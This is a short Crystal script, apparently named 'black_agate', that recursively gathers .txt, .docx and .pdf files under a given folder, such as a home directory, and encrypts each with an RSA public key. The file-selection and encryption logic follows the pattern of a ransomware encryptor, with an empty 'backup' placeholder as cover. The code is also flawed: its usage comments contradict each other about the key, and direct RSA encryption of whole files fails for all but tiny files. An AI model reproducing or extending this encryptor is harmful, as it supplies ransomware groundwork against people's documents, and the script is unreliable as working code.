require "openssl"
# Usage: crystal run encrypt_files.cr -- /path/to/home/folder "your_private_key_here"
# crystal build black_agate.cr

# Placeholder for the backup function
# This function will be responsible for creating backups of the files
# You will need to implement the actual backup logic
def backup_files(file_paths : Array(String))
  puts "Backing up files..."
  # Placeholder: Implement backup logic here
  # For example, copying files to a backup directory
end

# Encrypts the file content using asymmetric encryption (RSA)
def encrypt_file(file_path : String, public_key_path : String)
  public_key = OpenSSL::PKey::RSA.new(File.read(public_key_path))
  
  # Read the file content
  file_content = File.read(file_path)
  
  # Encrypt the file content using the public key
  encrypted_data = public_key.public_encrypt(file_content)
  
  # Save the encrypted data to a new file
  File.write("#{file_path}.enc", encrypted_data)
  puts "File encrypted: #{file_path}.enc"
end

# Recursive method to find files with specific extensions and prepare them for backup
def prepare_files_for_encryption(directory : String, public_key_path : String, extensions : Array(String), files_to_backup : Array(String))
  Dir.each_child(directory) do |entry|
    full_path = File.join(directory, entry)
    if File.directory?(full_path)
      prepare_files_for_encryption(full_path, public_key_path, extensions, files_to_backup)
    elsif extensions.any? { |ext| full_path.ends_with?(ext) }
      files_to_backup << full_path
    end
  end
end

# Main execution starts here
if ARGV.size != 2
  puts "Usage: crystal run encrypt_files.cr -- <directory_to_encrypt> <public_key_path>"
  exit
end

directory_to_encrypt = ARGV[0]
public_key_path = ARGV[1]
extensions_to_encrypt = [".txt", ".docx", ".pdf"] # Add or remove extensions as needed

files_to_backup = [] of String
prepare_files_for_encryption(directory_to_encrypt, public_key_path, extensions_to_encrypt, files_to_backup)

# Call the placeholder backup function
backup_files(files_to_backup)

# Proceed with encryption
files_to_backup.each do |file_path|
  encrypt_file(file_path, public_key_path)
end

puts "Encryption process completed."

